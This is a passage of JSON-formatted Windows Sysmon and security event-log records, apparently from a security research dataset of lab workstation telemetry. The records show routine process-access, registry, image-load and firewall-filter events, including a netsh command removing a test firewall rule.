{"RecordNumber": 678013, "ProcessId": "908", "TargetImage": "C:\\windows\\system32\\backgroundTaskHost.exe", "ExecutionProcessID": 3120, "SourceName": "Microsoft-Windows-Sysmon", "SourceModuleName": "eventlog", "Task": 10, "GrantedAccess": "0x1000", "EventTime": "2020-10-09 18:30:12", "UserID": "S-1-5-18", "CallTrace": "C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+37ea0|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+37929|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+686f8|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+6e84a|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+6f700|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+34be4|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+6f63e|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+713b5|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+50bda|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+4500a|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51", "@timestamp": "2020-10-09T22:30:59.489Z", "Severity": "INFO", "EventReceivedTime": "2020-10-09 18:30:59", "EventType": "INFO", "EventID": 10, "UtcTime": "2020-10-09 22:30:12.697", "Channel": "Microsoft-Windows-Sysmon/Operational", "Domain": "NT AUTHORITY", "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "SeverityValue": 2, "Hostname": "WORKSTATION5.theshire.local", "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-10-09 22:30:12.697\r\nSourceProcessGUID: {42c2e005-a298-5f7e-1000-000000000400}\r\nSourceProcessId: 908\r\nSourceThreadId: 824\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {42c2e005-e3ec-5f80-3c08-000000000400}\r\nTargetProcessId: 11384\r\nTargetImage: C:\\windows\\system32\\backgroundTaskHost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+37ea0|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+37929|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+686f8|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+6e84a|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+6f700|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+34be4|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+6f63e|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+713b5|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+50bda|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+4500a|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51", "SourceProcessId": "908", "RuleName": "-", "TargetProcessId": "11384", "SourceProcessGUID": "{42c2e005-a298-5f7e-1000-000000000400}", "SourceThreadId": "824", "SourceImage": "C:\\windows\\system32\\svchost.exe", "TargetProcessGUID": "{42c2e005-e3ec-5f80-3c08-000000000400}", "Category": "Process accessed (rule: ProcessAccess)", "host": "wec.internal.cloudapp.net", "port": 58623, "tags": ["mordorDataset"], "ThreadID": 820, "Version": 3, "OpcodeValue": 0, "@version": "1", "Keywords": -9223372036854775808, "Opcode": "Info", "AccountName": "SYSTEM", "AccountType": "User", "SourceModuleType": "im_msvistalog"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "Pedro01", "TimeCreated": "2022-08-08T01:56:15.751Z", "@timestamp": "2022-08-08T01:56:15.751Z", "EventID": 10, "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2022-08-08 20:56:15.731\r\nSourceProcessGUID: {625b42a0-762f-62f1-1f00-000000000a00}\r\nSourceProcessId: 1188\r\nSourceThreadId: 1404\r\nSourceImage: C:\\Windows\\System32\\VBoxService.exe\r\nTargetProcessGUID: {625b42a0-7739-62f1-c900-000000000a00}\r\nTargetProcessId: 5272\r\nTargetImage: C:\\Windows\\system32\\conhost.exe\r\nGrantedAccess: 0x1400\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+2730e|C:\\Windows\\System32\\VBoxService.exe+13357|C:\\Windows\\System32\\VBoxService.exe+145ff|C:\\Windows\\System32\\VBoxService.exe+1487e|C:\\Windows\\System32\\VBoxService.exe+102bb|C:\\Windows\\System32\\VBoxService.exe+10dc0|C:\\Windows\\System32\\VBoxService.exe+17ee|C:\\Windows\\System32\\VBoxService.exe+3234f|C:\\Windows\\System32\\VBoxService.exe+35f1c|C:\\Windows\\System32\\VBoxService.exe+103663|C:\\Windows\\System32\\VBoxService.exe+1036f7|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71\r\nSourceUser: NT AUTHORITY\\SYSTEM\r\nTargetUser: PEDRO01\\pedro", "Task": "10", "RuleName": "-", "UtcTime": "2022-08-08 20:56:15.731", "SourceProcessGUID": "{625b42a0-762f-62f1-1f00-000000000a00}", "SourceProcessId": "1188", "SourceThreadId": "1404", "SourceImage": "C:\\Windows\\System32\\VBoxService.exe", "TargetProcessGUID": "{625b42a0-7739-62f1-c900-000000000a00}", "TargetProcessId": "5272", "TargetImage": "C:\\Windows\\system32\\conhost.exe", "GrantedAccess": "0x1400", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+2730e|C:\\Windows\\System32\\VBoxService.exe+13357|C:\\Windows\\System32\\VBoxService.exe+145ff|C:\\Windows\\System32\\VBoxService.exe+1487e|C:\\Windows\\System32\\VBoxService.exe+102bb|C:\\Windows\\System32\\VBoxService.exe+10dc0|C:\\Windows\\System32\\VBoxService.exe+17ee|C:\\Windows\\System32\\VBoxService.exe+3234f|C:\\Windows\\System32\\VBoxService.exe+35f1c|C:\\Windows\\System32\\VBoxService.exe+103663|C:\\Windows\\System32\\VBoxService.exe+1036f7|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71", "SourceUser": "NT AUTHORITY\\SYSTEM", "TargetUser": "PEDRO01\\pedro"}
{"RecordNumber": 370060, "Channel": "Microsoft-Windows-Sysmon/Operational", "Category": "Registry object added or deleted (rule: RegistryEvent)", "UserID": "S-1-5-18", "AccountName": "SYSTEM", "Severity": "INFO", "Hostname": "WORKSTATION5.theshire.local", "EventTypeOrignal": "INFO", "EventTime": "2020-09-01 21:44:24", "ExecutionProcessID": 3120, "@timestamp": "2020-09-02T01:44:26.141Z", "EventReceivedTime": "2020-09-01 21:44:26", "ThreadID": 4312, "SourceModuleType": "im_msvistalog", "ProcessId": "736", "tags": ["mordorDataset"], "ProcessGuid": "{ff90ade3-459a-5f4e-0c00-000000000400}", "Image": "C:\\windows\\system32\\lsass.exe", "SourceName": "Microsoft-Windows-Sysmon", "host": "wec.internal.cloudapp.net", "Domain": "NT AUTHORITY", "OpcodeValue": 0, "Message": "Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2020-09-02 01:44:24.615\r\nProcessGuid: {ff90ade3-459a-5f4e-0c00-000000000400}\r\nProcessId: 736\r\nImage: C:\\windows\\system32\\lsass.exe\r\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\W32Time\\SecureTimeLimits\\RunTime", "SeverityValue": 2, "port": 57603, "@version": "1", "Keywords": -9223372036854775808, "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "Version": 2, "AccountType": "User", "RuleName": "-", "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\W32Time\\SecureTimeLimits\\RunTime", "SourceModuleName": "eventlog", "UtcTime": "2020-09-02 01:44:24.615", "EventType": "CreateKey", "Task": 12, "Opcode": "Info", "EventID": 12}
{"Keywords": 36028797018963968, "SeverityValue": 2, "EventReceivedTime": "2020-09-21 22:14:29", "EventID": 800, "ExecutionProcessID": 0, "Channel": "Windows PowerShell", "host": "wec.internal.cloudapp.net", "ThreadID": 0, "EventType": "INFO", "Opcode": "Info", "EventTime": "2020-09-21 22:14:23", "@timestamp": "2020-09-22T02:14:29.917Z", "SourceModuleType": "im_msvistalog", "port": 64545, "RecordNumber": 19083, "Task": 8, "@version": "1", "SourceModuleName": "eventlog", "ERROR_EVT_UNRESOLVED": true, "Severity": "INFO", "SourceName": "PowerShell", "Category": "Pipeline Execution Details", "tags": ["mordorDataset"], "Hostname": "WORKSTATION6"}
{"ImageLoaded": "C:\\Windows\\SysWOW64\\srvcli.dll", "SeverityValue": 2, "EventReceivedTime": "2020-09-18 13:08:23", "EventID": 7, "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "ExecutionProcessID": 3392, "Channel": "Microsoft-Windows-Sysmon/Operational", "host": "wec.internal.cloudapp.net", "AccountType": "User", "ProcessGuid": "{d273d0f0-e919-5f64-2801-000000000800}", "Opcode": "Info", "EventTime": "2020-09-18 13:06:34", "Signed": "true", "SourceModuleType": "im_msvistalog", "AccountName": "SYSTEM", "Domain": "NT AUTHORITY", "@version": "1", "OpcodeValue": 0, "SignatureStatus": "Valid", "Severity": "INFO", "Hashes": "SHA1=596E9F61C52904E650BA90141408A28C4EABE443,MD5=1D36577B113E459418270DD146EF76D3,SHA256=008AED87BF6060F66BC1E71ECA0D48966D94EAD272DCDC3303FF192F5580E551,IMPHASH=0C87D62D6A9B9EC13E119327AF4ECEA0", "SourceName": "Microsoft-Windows-Sysmon", "Description": "Server Service Client DLL", "Category": "Image loaded (rule: ImageLoad)", "Company": "Microsoft Corporation", "Keywords": -9223372036854775808, "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "UserID": "S-1-5-18", "ThreadID": 5556, "EventType": "INFO", "@timestamp": "2020-09-18T17:08:23.851Z", "port": 64545, "RecordNumber": 1712284, "Task": 7, "Signature": "Microsoft Windows", "SourceModuleName": "eventlog", "Version": 3, "Product": "Microsoft® Windows® Operating System", "Image": "C:\\ProgramData\\bginfo.exe", "OriginalFileName": "SRVCLI.DLL", "UtcTime": "2020-09-18 17:06:34.286", "Hostname": "WORKSTATION6.theshire.local", "RuleName": "-", "tags": ["mordorDataset"]}
{"Company": "Microsoft Corporation", "Task": "1", "Description": "Network Command Shell", "CommandLine": "netsh  advfirewall firewall delete rule name=\"atomic testing\" protocol=TCP localport=450 ", "TimeCreated": "2020-10-21 12:19:09.031", "Product": "Microsoft® Windows® Operating System", "OriginalFileName": "netsh.exe", "User": "WORKSTATION5\\wardog", "ParentProcessId": "4160", "Channel": "Microsoft-Windows-Sysmon/Operational", "IntegrityLevel": "High", "ProcessGuid": "{39e4a257-b6bd-5f8f-730c-000000000700}", "CurrentDirectory": "C:\\Users\\wardog\\", "Hashes": "SHA1=E7A3B17F625283E3064D91A988D0B1694BA3E9B8,MD5=79CBBF946E797103BED792740AEBFEC1,SHA256=90F0822D26680C8FFD703A080C876F87695580747A3704C169E39E1A8802EA38,IMPHASH=90B4317BE51850B8EF9F14EB56FB7DDC", "UtcTime": "2020-10-21 04:19:09.027", "SourceName": "Microsoft-Windows-Sysmon", "ParentCommandLine": "\"C:\\windows\\system32\\cmd.exe\" ", "TerminalSessionId": "2", "ProcessId": "9812", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "ParentProcessGuid": "{39e4a257-b6a7-5f8f-6f0c-000000000700}", "LogonGuid": "{39e4a257-f1ac-5f8b-d961-0c0000000000}", "Image": "C:\\Windows\\System32\\netsh.exe", "Hostname": "WORKSTATION5", "LogonId": "0xc61d9", "EventID": 1, "RuleName": "-", "Message": "Process Create:\r\nRuleName: -\r\nUtcTime: 2020-10-21 04:19:09.027\r\nProcessGuid: {39e4a257-b6bd-5f8f-730c-000000000700}\r\nProcessId: 9812\r\nImage: C:\\Windows\\System32\\netsh.exe\r\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\r\nDescription: Network Command Shell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: netsh.exe\r\nCommandLine: netsh  advfirewall firewall delete rule name=\"atomic testing\" protocol=TCP localport=450 \r\nCurrentDirectory: C:\\Users\\wardog\\\r\nUser: WORKSTATION5\\wardog\r\nLogonGuid: {39e4a257-f1ac-5f8b-d961-0c0000000000}\r\nLogonId: 0xC61D9\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA1=E7A3B17F625283E3064D91A988D0B1694BA3E9B8,MD5=79CBBF946E797103BED792740AEBFEC1,SHA256=90F0822D26680C8FFD703A080C876F87695580747A3704C169E39E1A8802EA38,IMPHASH=90B4317BE51850B8EF9F14EB56FB7DDC\r\nParentProcessGuid: {39e4a257-b6a7-5f8f-6f0c-000000000700}\r\nParentProcessId: 4160\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\windows\\system32\\cmd.exe\" "}
{"Keywords": -9223372036854775808, "SeverityValue": 2, "TargetObject": "HKU\\.DEFAULT\\Software\\Policies\\Microsoft\\SystemCertificates\\Disallowed\\Certificates", "EventTypeOrignal": "INFO", "EventID": 12, "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "ExecutionProcessID": 3392, "host": "wec.internal.cloudapp.net", "Channel": "Microsoft-Windows-Sysmon/Operational", "UserID": "S-1-5-18", "AccountType": "User", "ThreadID": 5552, "ProcessGuid": "{d273d0f0-e865-5f64-0c00-000000000800}", "EventReceivedTime": "2020-09-18 13:08:54", "Opcode": "Info", "EventTime": "2020-09-18 13:06:58", "@timestamp": "2020-09-18T17:08:54.444Z", "SourceModuleType": "im_msvistalog", "port": 64545, "AccountName": "SYSTEM", "RecordNumber": 1722651, "Task": 12, "Domain": "NT AUTHORITY", "@version": "1", "OpcodeValue": 0, "SourceModuleName": "eventlog", "Severity": "INFO", "SourceName": "Microsoft-Windows-Sysmon", "Version": 2, "Image": "C:\\windows\\system32\\WerFault.exe", "Category": "Registry object added or deleted (rule: RegistryEvent)", "UtcTime": "2020-09-18 17:06:58.928", "Hostname": "WORKSTATION6.theshire.local", "RuleName": "-", "tags": ["mordorDataset"]}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "pedro-computer", "TimeCreated": "2022-08-18T03:48:48.760Z", "@timestamp": "2022-08-18T03:48:48.760Z", "EventID": 10, "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2022-08-18 22:48:48.753\r\nSourceProcessGUID: {564ff025-a9e3-62fe-1e00-000000000700}\r\nSourceProcessId: 1172\r\nSourceThreadId: 1204\r\nSourceImage: C:\\Windows\\System32\\VBoxService.exe\r\nTargetProcessGUID: {564ff025-7fb5-62fe-2300-000000000700}\r\nTargetProcessId: 1280\r\nTargetImage: C:\\Windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1400\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+2730e|C:\\Windows\\System32\\VBoxService.exe+13317|C:\\Windows\\System32\\VBoxService.exe+14569|C:\\Windows\\System32\\VBoxService.exe+1483e|C:\\Windows\\System32\\VBoxService.exe+1027b|C:\\Windows\\System32\\VBoxService.exe+10d80|C:\\Windows\\System32\\VBoxService.exe+17ee|C:\\Windows\\System32\\VBoxService.exe+3230f|C:\\Windows\\System32\\VBoxService.exe+35edc|C:\\Windows\\System32\\VBoxService.exe+103653|C:\\Windows\\System32\\VBoxService.exe+1036e7|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71", "Task": "10", "RuleName": "-", "UtcTime": "2022-08-18 22:48:48.753", "SourceProcessGUID": "{564ff025-a9e3-62fe-1e00-000000000700}", "SourceProcessId": "1172", "SourceThreadId": "1204", "SourceImage": "C:\\Windows\\System32\\VBoxService.exe", "TargetProcessGUID": "{564ff025-7fb5-62fe-2300-000000000700}", "TargetProcessId": "1280", "TargetImage": "C:\\Windows\\System32\\svchost.exe", "GrantedAccess": "0x1400", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+2730e|C:\\Windows\\System32\\VBoxService.exe+13317|C:\\Windows\\System32\\VBoxService.exe+14569|C:\\Windows\\System32\\VBoxService.exe+1483e|C:\\Windows\\System32\\VBoxService.exe+1027b|C:\\Windows\\System32\\VBoxService.exe+10d80|C:\\Windows\\System32\\VBoxService.exe+17ee|C:\\Windows\\System32\\VBoxService.exe+3230f|C:\\Windows\\System32\\VBoxService.exe+35edc|C:\\Windows\\System32\\VBoxService.exe+103653|C:\\Windows\\System32\\VBoxService.exe+1036e7|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "DESKTOP-CQF82L6", "TimeCreated": "2022-07-05T02:01:51.577Z", "@timestamp": "2022-07-05T02:01:51.577Z", "EventID": 10, "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2022-07-05 21:01:51.564\r\nSourceProcessGUID: {01e2a015-a601-62c4-7607-000000000700}\r\nSourceProcessId: 2088\r\nSourceThreadId: 788\r\nSourceImage: C:\\Windows\\System32\\RuntimeBroker.exe\r\nTargetProcessGUID: {01e2a015-a5e2-62c4-6607-000000000700}\r\nTargetProcessId: 4300\r\nTargetImage: C:\\Windows\\system32\\backgroundTaskHost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9de14|C:\\Windows\\System32\\RPCRT4.dll+3c344|C:\\Windows\\System32\\combase.dll+3943c|C:\\Windows\\System32\\RuntimeBroker.exe+2a47|C:\\Windows\\System32\\RuntimeBroker.exe+288b|C:\\Windows\\System32\\RPCRT4.dll+79633|C:\\Windows\\System32\\RPCRT4.dll+dd77b|C:\\Windows\\System32\\RPCRT4.dll+1ba89|C:\\Windows\\System32\\combase.dll+2333c|C:\\Windows\\System32\\combase.dll+d02b3|C:\\Windows\\System32\\combase.dll+d003e|C:\\Windows\\System32\\combase.dll+2b9b6|C:\\Windows\\System32\\combase.dll+9ad83|C:\\Windows\\System32\\combase.dll+1cf7d|C:\\Windows\\System32\\combase.dll+760f6|C:\\Windows\\System32\\combase.dll+fc274|C:\\Windows\\System32\\combase.dll+780b9|C:\\Windows\\System32\\RPCRT4.dll+5a408|C:\\Windows\\System32\\RPCRT4.dll+3a266|C:\\Windows\\System32\\RPCRT4.dll+39e96|C:\\Windows\\System32\\RPCRT4.dll+4885f|C:\\Windows\\System32\\RPCRT4.dll+47e18|C:\\Windows\\System32\\RPCRT4.dll+47401|C:\\Windows\\System32\\RPCRT4.dll+46e6e\r\nSourceUser: DESKTOP-CQF82L6\\pedro\r\nTargetUser: DESKTOP-CQF82L6\\pedro", "Task": "10", "RuleName": "-", "UtcTime": "2022-07-05 21:01:51.564", "SourceProcessGUID": "{01e2a015-a601-62c4-7607-000000000700}", "SourceProcessId": "2088", "SourceThreadId": "788", "SourceImage": "C:\\Windows\\System32\\RuntimeBroker.exe", "TargetProcessGUID": "{01e2a015-a5e2-62c4-6607-000000000700}", "TargetProcessId": "4300", "TargetImage": "C:\\Windows\\system32\\backgroundTaskHost.exe", "GrantedAccess": "0x1000", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9de14|C:\\Windows\\System32\\RPCRT4.dll+3c344|C:\\Windows\\System32\\combase.dll+3943c|C:\\Windows\\System32\\RuntimeBroker.exe+2a47|C:\\Windows\\System32\\RuntimeBroker.exe+288b|C:\\Windows\\System32\\RPCRT4.dll+79633|C:\\Windows\\System32\\RPCRT4.dll+dd77b|C:\\Windows\\System32\\RPCRT4.dll+1ba89|C:\\Windows\\System32\\combase.dll+2333c|C:\\Windows\\System32\\combase.dll+d02b3|C:\\Windows\\System32\\combase.dll+d003e|C:\\Windows\\System32\\combase.dll+2b9b6|C:\\Windows\\System32\\combase.dll+9ad83|C:\\Windows\\System32\\combase.dll+1cf7d|C:\\Windows\\System32\\combase.dll+760f6|C:\\Windows\\System32\\combase.dll+fc274|C:\\Windows\\System32\\combase.dll+780b9|C:\\Windows\\System32\\RPCRT4.dll+5a408|C:\\Windows\\System32\\RPCRT4.dll+3a266|C:\\Windows\\System32\\RPCRT4.dll+39e96|C:\\Windows\\System32\\RPCRT4.dll+4885f|C:\\Windows\\System32\\RPCRT4.dll+47e18|C:\\Windows\\System32\\RPCRT4.dll+47401|C:\\Windows\\System32\\RPCRT4.dll+46e6e", "SourceUser": "DESKTOP-CQF82L6\\pedro", "TargetUser": "DESKTOP-CQF82L6\\pedro"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "Pedro01", "TimeCreated": "2022-08-03T07:30:19.049Z", "@timestamp": "2022-08-03T07:30:19.049Z", "EventID": 12, "Message": "Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2022-08-04 02:30:19.046\r\nProcessGuid: {625b42a0-2f2e-62eb-8905-000000000900}\r\nProcessId: 4224\r\nImage: C:\\Windows\\system32\\backgroundTaskHost.exe\r\nTargetObject: \\REGISTRY\\A\\{d4c920b6-b7b7-1808-610c-227748f139d8}\\LocalState\r\nUser: PEDRO01\\IT01-Pedro", "Task": "12", "RuleName": "-", "EventType": "CreateKey", "UtcTime": "2022-08-04 02:30:19.046", "ProcessGuid": "{625b42a0-2f2e-62eb-8905-000000000900}", "ProcessId": "4224", "Image": "C:\\Windows\\system32\\backgroundTaskHost.exe", "TargetObject": "\\REGISTRY\\A\\{d4c920b6-b7b7-1808-610c-227748f139d8}\\LocalState", "User": "PEDRO01\\IT01-Pedro"}
{"SeverityValue": 2, "EventReceivedTime": "2020-09-21 23:28:47", "EventID": 5447, "ProviderGuid": "{54849625-5478-4994-A5BA-3E3B0328C30D}", "ExecutionProcessID": 696, "Channel": "Security", "host": "wec.internal.cloudapp.net", "ProcessId": "1524", "ChangeType": "%%16384", "Opcode": "Info", "EventTime": "2020-09-21 23:28:47", "FilterKey": "{1a37f3fe-3132-4114-ac17-98bf67dcd4bf}", "FilterType": "%%16388", "FilterName": "File Replication (RPC-EPMAP)", "SourceModuleType": "im_msvistalog", "@version": "1", "OpcodeValue": 0, "Severity": "INFO", "SourceName": "Microsoft-Windows-Security-Auditing", "Weight": "10378265515566039040", "UserName": "NT AUTHORITY\\LOCAL SERVICE", "Category": "Other Policy Change Events", "Keywords": -9214364837600034816, "ActivityID": "{ACAAA2B5-6AED-0001-4B50-4040058DD601}", "ThreadID": 6500, "EventType": "AUDIT_SUCCESS", "Message": "A Windows Filtering Platform filter has been changed.\r\n\t\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-19\r\n\tAccount Name:\t\tNT AUTHORITY\\LOCAL SERVICE\r\n\r\nProcess Information:\r\n\tProcess ID:\t1524\r\n\r\nProvider Information:\r\n\tID:\t\t{decc16ca-3f33-4346-be1e-8fb4ae0f3d62}\r\n\tName:\t\tMicrosoft Corporation\r\n\r\nChange Information:\r\n\tChange Type:\tAdd\r\n\r\nFilter Information:\r\n\tID:\t\t{1a37f3fe-3132-4114-ac17-98bf67dcd4bf}\r\n\tName:\t\tFile Replication (RPC-EPMAP)\r\n\tType:\t\tNot persistent\r\n\tRun-Time ID:\t77287\r\n\r\nLayer Information:\r\n\tID:\t\t{e1cd9fe7-f4b5-4273-96c0-592e487b8650}\r\n\tName:\t\tALE Receive/Accept v4 Layer\r\n\tRun-Time ID:\t44\r\n\r\nCallout Information:\r\n\tID:\t\t{00000000-0000-0000-0000-000000000000}\r\n\tName:\t\t-\r\n\r\nAdditional Information:\r\n\tWeight:\t10378265515566039040\t\r\n\tConditions:\t\n\tCondition ID:\t{d78e1e87-8644-4ea5-9437-d809ecefc971}\n\tMatch value:\tEqual to\n\tCondition value:\t\n    00000000  5c 00 64 00 65 00 76 00-69 00 63 00 65 00 5c 00  \\.d.e.v.i.c.e.\\.\n    00000010  68 00 61 00 72 00 64 00-64 00 69 00 73 00 6b 00  h.a.r.d.d.i.s.k.\n    00000020  76 00 6f 00 6c 00 75 00-6d 00 65 00 32 00 5c 00  v.o.l.u.m.e.2.\\.\n    00000030  77 00 69 00 6e 00 64 00-6f 00 77 00 73 00 5c 00  w.i.n.d.o.w.s.\\.\n    00000040  73 00 79 00 73 00 74 00-65 00 6d 00 33 00 32 00  s.y.s.t.e.m.3.2.\n    00000050  5c 00 73 00 76 00 63 00-68 00 6f 00 73 00 74 00  \\.s.v.c.h.o.s.t.\n    00000060  2e 00 65 00 78 00 65 00-00 00                    ..e.x.e...\n\n\n\tCondition ID:\t{af043a0a-b34d-4f86-979c-c90371af6e66}\n\tMatch value:\tEqual to\n\tCondition value:\t\nO:SYG:SYD:(A;;CCRC;;;S-1-5-80-979556362-403687129-3954533659-2335141334-1547273080)\n\n\n\tCondition ID:\t{0c1ba1af-5765-453f-af22-a8f791ac775b}\n\tMatch value:\tEqual to\n\tCondition value:\t0x0087\n\n\tCondition ID:\t{3971ef2b-623e-4f9a-8cb1-6e79b806b9a7}\n\tMatch value:\tEqual to\n\tCondition value:\t0x06\n\r\n\tFilter Action:\tPermit", "LayerId": "44", "Action": "%%16390", "@timestamp": "2020-09-22T03:28:47.445Z", "port": 64545, "CalloutKey": "{00000000-0000-0000-0000-000000000000}", "RecordNumber": 1962131, "CalloutName": "-", "Task": 13573, "SourceModuleName": "eventlog", "FilterId": "77287", "LayerName": "ALE Receive/Accept v4 Layer", "Version": 0, "UserSid": "S-1-5-19", "ProviderName": "Microsoft Corporation", "LayerKey": "{e1cd9fe7-f4b5-4273-96c0-592e487b8650}", "ProviderKey": "{decc16ca-3f33-4346-be1e-8fb4ae0f3d62}", "Conditions": "\n\tCondition ID:\t{d78e1e87-8644-4ea5-9437-d809ecefc971}\n\tMatch value:\tEqual to\n\tCondition value:\t\n    00000000  5c 00 64 00 65 00 76 00-69 00 63 00 65 00 5c 00  \\.d.e.v.i.c.e.\\.\n    00000010  68 00 61 00 72 00 64 00-64 00 69 00 73 00 6b 00  h.a.r.d.d.i.s.k.\n    00000020  76 00 6f 00 6c 00 75 00-6d 00 65 00 32 00 5c 00  v.o.l.u.m.e.2.\\.\n    00000030  77 00 69 00 6e 00 64 00-6f 00 77 00 73 00 5c 00  w.i.n.d.o.w.s.\\.\n    00000040  73 00 79 00 73 00 74 00-65 00 6d 00 33 00 32 00  s.y.s.t.e.m.3.2.\n    00000050  5c 00 73 00 76 00 63 00-68 00 6f 00 73 00 74 00  \\.s.v.c.h.o.s.t.\n    00000060  2e 00 65 00 78 00 65 00-00 00                    ..e.x.e...\n\n\n\tCondition ID:\t{af043a0a-b34d-4f86-979c-c90371af6e66}\n\tMatch value:\tEqual to\n\tCondition value:\t\nO:SYG:SYD:(A;;CCRC;;;S-1-5-80-979556362-403687129-3954533659-2335141334-1547273080)\n\n\n\tCondition ID:\t{0c1ba1af-5765-453f-af22-a8f791ac775b}\n\tMatch value:\tEqual to\n\tCondition value:\t0x0087\n\n\tCondition ID:\t{3971ef2b-623e-4f9a-8cb1-6e79b806b9a7}\n\tMatch value:\tEqual to\n\tCondition value:\t0x06\n", "tags": ["mordorDataset"], "Hostname": "MORDORDC.theshire.local"}
{"SourceImage": "C:\\windows\\system32\\svchost.exe", "TimeCreated": "2020-10-18 02:17:04.238", "GrantedAccess": "0x3000", "SourceThreadId": "2020", "CallTrace": "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+305fe|c:\\windows\\system32\\sysmain.dll+44b1f|c:\\windows\\system32\\sysmain.dll+1e899|c:\\windows\\system32\\sysmain.dll+1e7be|c:\\windows\\system32\\sysmain.dll+1e6a5|c:\\windows\\system32\\sysmain.dll+1e509|c:\\windows\\system32\\sysmain.dll+1c32b|c:\\windows\\system32\\sysmain.dll+1bf95|c:\\windows\\system32\\sysmain.dll+74b0d|c:\\windows\\system32\\sysmain.dll+73b32|c:\\windows\\system32\\sysmain.dll+601a3|C:\\windows\\system32\\svchost.exe+314c|C:\\windows\\System32\\sechost.dll+2de2|C:\\windows\\System32\\KERNEL32.DLL+17c24|C:\\windows\\SYSTEM32\\ntdll.dll+6cea1", "UtcTime": "2020-10-18 06:17:04.226", "TargetProcessGUID": "{39e4a257-f724-5f87-2500-000000000400}", "SourceProcessId": "1936", "EventID": 10, "Channel": "Microsoft-Windows-Sysmon/Operational", "Task": "10", "RuleName": "-", "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-10-18 06:17:04.226\r\nSourceProcessGUID: 